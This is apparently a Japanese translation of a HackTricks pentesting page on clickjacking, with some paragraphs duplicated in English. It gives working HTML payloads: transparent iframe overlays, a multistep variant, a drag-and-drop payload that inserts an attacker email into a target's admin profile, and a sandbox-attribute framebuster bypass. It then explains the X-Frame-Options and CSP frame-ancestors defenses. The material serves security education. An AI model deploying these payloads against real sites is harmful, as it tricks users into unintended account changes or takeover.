# クリックジャッキング

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化されたワークフローを簡単に構築して**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## クリックジャッキングとは

クリックジャッキングは、**ユーザー**が**見えない**または他の要素に偽装されたウェブページの**要素**を**クリック**するように**だます**攻撃です。これにより、ユーザーは知らずにマルウェアをダウンロードしたり、悪意のあるウェブページを訪れたり、資格情報や機密情報を提供したり、お金を送金したり、オンラインで商品を購入したりすることがあります（[ここから](https://www.imperva.com/learn/application-security/clickjacking/)）。

### フォームの事前入力トリック

時には、ページの読み込み時にGETパラメータを使用してフォームのフィールドの値を**自動的に入力**することができます。攻撃者はこの動作を悪用して、フォームに任意のデータを入力し、クリックジャッキングペイロードを送信してユーザーがボタンを押すようにします。

### ドラッグ＆ドロップでフォームを入力

ユーザーにフォームを**入力**してもらいたいが、特定の情報（メールアドレスや特定のパスワードなど）を直接尋ねることはしたくない場合、[**この例**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)のように、制御されたデータを書き込むものを**ドラッグ＆ドロップ**するように依頼することができます。

### 基本的なペイロード
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### マルチステップペイロード

In some cases, a simple clickjacking attack may not be enough to achieve the desired outcome. In such situations, a multistep payload can be used to execute a series of actions on the victim's behalf.

いくつかの場合において、単純なクリックジャッキング攻撃では望ましい結果を得ることができないことがあります。そのような状況では、マルチステップペイロードを使用して、被害者の代わりに一連のアクションを実行することができます。

The multistep payload involves embedding multiple iframes within iframes, each containing a specific action to be performed. By carefully orchestrating the sequence of actions, an attacker can trick the victim into unknowingly performing actions that they did not intend to.

マルチステップペイロードでは、特定のアクションを含む複数のiframeをiframeに埋め込むことが含まれます。アクションのシーケンスを注意深く組み立てることで、攻撃者は被害者を騙して意図しないアクションを実行させることができます。

To implement a multistep payload, the attacker needs to identify the sequence of actions required to achieve their goal. They then create iframes for each action and embed them within each other, ensuring that the victim's clicks are redirected to the desired targets.

マルチステップペイロードを実装するために、攻撃者は目標を達成するために必要なアクションのシーケンスを特定する必要があります。それから、各アクションに対してiframeを作成し、互いに埋め込みます。これにより、被害者のクリックが目的のターゲットにリダイレクトされるようにします。

It is important to note that multistep payloads can be more complex and may require additional techniques such as framebusting or other countermeasures to prevent detection and mitigation.

マルチステップペイロードはより複雑であり、検出と緩和を防ぐためにフレームブレーキングやその他の対策などの追加のテクニックが必要な場合があることに注意してください。
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### ドラッグ＆ドロップ + クリックのペイロード

This technique combines the use of drag and drop events with a click payload to perform a clickjacking attack. The idea is to trick the user into unknowingly performing a malicious action by disguising it as a harmless action.

この技術は、ドラッグ＆ドロップイベントとクリックのペイロードを組み合わせて、クリックジャッキング攻撃を行います。そのアイデアは、無害なアクションと偽装して、ユーザーを知らず知らずのうちに悪意のあるアクションを実行させることです。

The first step is to create a draggable element on the attacker-controlled page. This can be done using HTML5's draggable attribute or JavaScript's drag and drop API. Once the element is draggable, the attacker can position it over a target element on the victim's page.

最初のステップは、攻撃者が制御するページ上にドラッグ可能な要素を作成することです。これは、HTML5のdraggable属性やJavaScriptのドラッグ＆ドロップAPIを使用して行うことができます。要素がドラッグ可能になったら、攻撃者はそれを被害者のページ上のターゲット要素の上に配置することができます。

Next, the attacker creates a transparent iframe that covers the draggable element. This iframe will act as a layer between the victim's page and the draggable element, preventing the victim from directly interacting with the element.

次に、攻撃者は透明なiframeを作成し、ドラッグ可能な要素を覆います。このiframeは、被害者のページとドラッグ可能な要素の間にレイヤーとして機能し、被害者が要素と直接的にやり取りすることを防ぎます。

When the victim interacts with the draggable element, such as clicking on it, the click event is intercepted by the transparent iframe. The attacker can then trigger a click event on a hidden button or link within the iframe, effectively performing a clickjacking attack.

被害者がドラッグ可能な要素とやり取りする（例：クリックする）と、クリックイベントは透明なiframeによって傍受されます。攻撃者は、iframe内の非表示のボタンやリンクでクリックイベントをトリガーし、実質的にクリックジャッキング攻撃を実行することができます。

To mitigate this type of attack, web developers should ensure that user interactions are properly validated and that draggable elements are not overlapped by transparent iframes.

この種の攻撃を軽減するために、ウェブ開発者はユーザーのやり取りが適切に検証されていることを確認し、ドラッグ可能な要素が透明なiframeによって重ならないようにする必要があります。
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + クリックジャッキング

ユーザーがクリックする必要がある **XSS 攻撃** を特定し、ページが **クリックジャッキングの脆弱性** を持っている場合、ユーザーを騙してボタン/リンクをクリックさせることで悪用することができます。\
例:\
_アカウントの一部のプライベートな詳細情報（あなただけが設定および読み取り可能な詳細情報）に **セルフ XSS** を見つけました。これらの詳細を設定するためのページは **クリックジャッキングの脆弱性** を持っており、GET パラメータで **フォーム** を **事前に入力** することができます。_\
\_\_攻撃者は、そのページに対して **クリックジャッキング** 攻撃を準備し、**XSS ペイロード** を **フォーム** に **事前に入力** して **ユーザー** を **フォームを送信** するように **騙す** ことができます。そのため、**フォームが送信されると** 値が変更され、**ユーザーが XSS を実行** します。

## クリックジャッキングを回避する方法

### クライアント側の防御策

クリックジャッキングを防ぐために、クライアント側で以下の動作を行うスクリプトを実行することができます。

* 現在のアプリケーションウィンドウがメインまたはトップウィンドウであることを確認および強制する
* すべてのフレームを表示する
* 不可視フレームをクリックできないようにする
* ユーザーに対して潜在的なクリックジャッキング攻撃を検出および警告する

#### バイパス

フレームバスターは JavaScript であるため、ブラウザのセキュリティ設定によってその動作が阻止される場合があります。実際には、ブラウザが JavaScript をサポートしていない場合もあります。フレームバスターに対する効果的な攻撃者の回避策は、**HTML5 の iframe `sandbox` 属性** を使用することです。これを `allow-forms` または `allow-scripts` の値で設定し、`allow-top-navigation` の値を省略すると、フレームバスタースクリプトは中断されます。なぜなら、iframe は自身がトップウィンドウであるかどうかをチェックできないからです。
```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
`allow-forms`と`allow-scripts`の両方の値は、iframe内で指定されたアクションを許可しますが、トップレベルのナビゲーションは無効になります。これにより、ターゲットサイト内の機能は許可されますが、フレームの破壊行為は防止されます。

実行するClickjacking攻撃のタイプによっては、`allow-same-origin`と`allow-modals`、または[さらに多くの設定](https://www.w3schools.com/tags/att_iframe_sandbox.asp)が必要になる場合があります。攻撃を準備する際には、ブラウザのコンソールを確認して、他の設定が必要かどうかを確認してください。

### X-Frame-Options

**`X-Frame-Options` HTTPレスポンスヘッダー**は、ブラウザがページを`<frame>`または`<iframe>`でレンダリングするかどうかを示すために使用されます。サイトはこれを使用して、**自身のコンテンツが他のサイトに埋め込まれないように**することで、Clickjacking攻撃を回避できます。すべてのHTMLコンテンツを含むレスポンスに対して**`X-Frame-Options`ヘッダーを設定**します。可能な値は次のとおりです。

* `X-Frame-Options: deny`は、**どのドメインからもコンテンツをフレーム化することを防止**します（推奨値）
* `X-Frame-Options: sameorigin`は、**現在のサイトのみ**がコンテンツをフレーム化できるようにします。
* `X-Frame-Options: allow-from https://trusted.com`は、指定された「uri」がこのページをフレーム化できるようにします。
* ブラウザがサポートしていない場合、これは**オープンに失敗します**ので、制限事項を確認してください。
* 他のブラウザは、新しい**CSP frame-ancestorsディレクティブ**もサポートしています。一部のブラウザは両方をサポートしています。

### Content Security Policy（CSP）frame-ancestorsディレクティブ

推奨されるClickjacking保護は、アプリケーションのContent Security Policyに**`frame-ancestorsディレクティブ`**を組み込むことです。\
**`frame-ancestors 'none'`**ディレクティブは、**X-Frame-Options `deny`**ディレクティブと同様の動作をします（誰もページをフレーム化できません）。\
**`frame-ancestors 'self'`**ディレクティブは、**X-Frame-Options `sameorigin`**ディレクティブとほぼ同等です（現在のサイトのみがフレーム化できます）。\
**`frame-ancestors trusted.com`**ディレクティブは、**X-Frame-Options** `allow-from`ディレクティブとほぼ同等です（信頼されたサイトのみがフレーム化できます）。

次のCSPは、同じドメインのフレームのみをホワイトリストに登録します。

`Content-Security-Policy: frame-ancestors 'self';`

詳細な情報やより複雑な例については、次のドキュメントを参照してください。

* [https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

### 制限事項 <a href="#limitations" id="limitations"></a>

* **ブラウザのサポート:** CSP frame-ancestorsは、まだすべての主要なブラウザでサポートされていません。
* **X-Frame-Optionsが優先される:** CSP仕様の「関連付けとX-Frame-Options」セクションは、「_frame-ancestorsディレクティブを含むポリシーがリソースとともに配信され、その配置が「強制」である場合、X-Frame-Optionsヘッダーは無視される必要がある_」と述べていますが、Chrome 40とFirefox 35はframe-ancestorsディレクティブを無視し、代わりにX-Frame-Optionsヘッダーに従います。

## 参考文献

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)をご覧ください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
